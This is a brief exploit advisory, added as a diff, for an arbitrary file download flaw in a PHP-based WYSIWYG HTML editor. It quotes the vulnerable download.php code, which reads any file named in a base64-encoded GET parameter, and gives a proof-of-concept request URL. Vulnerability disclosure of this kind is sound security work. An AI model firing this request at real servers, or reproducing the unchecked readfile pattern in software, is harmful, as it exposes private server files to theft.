@@ -1,0 +1,44 @@
+# # # # # 
+# Exploit Title: WYSIWYG HTML Editor PRO 1.0 - Arbitrary File Download
+# Dork: N/A
+# Date: 28.08.2017
+# Vendor Homepage: http://nelliwinne.net/
+# Software Link: https://codecanyon.net/item/wysiwyg-html-editor-pro-php-based-editor-with-image-uploader-and-more/19012022
+# Demo: http://codecanyon.nelliwinne.net/WYSIWYGEditorPRO/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The security obligation allows an attacker to arbitrary download files..
+#
+# Vulnerable Source:
+#
+# .............
+# <?php
+# $file = base64_decode($_GET['id']);
+# 
+# if (file_exists($file)) {
+#     header('Content-Description: File Transfer');
+#     header('Content-Type: application/octet-stream');
+#     header('Content-Disposition: attachment; filename="'.basename($file).'"');
+#     header('Expires: 0');
+#     header('Cache-Control: must-revalidate');
+#     header('Pragma: public');
+#     header('Content-Length: ' . filesize($file));
+#     readfile($file);
+#     exit;
+# }
+# ?>
+# .............
+# Proof of Concept:
+#
+# http://localhost/[PATH]/wysiwyg/download.php?id=[FILENAME_to_BASE64]
+# 
+# Etc...
+# # # # #
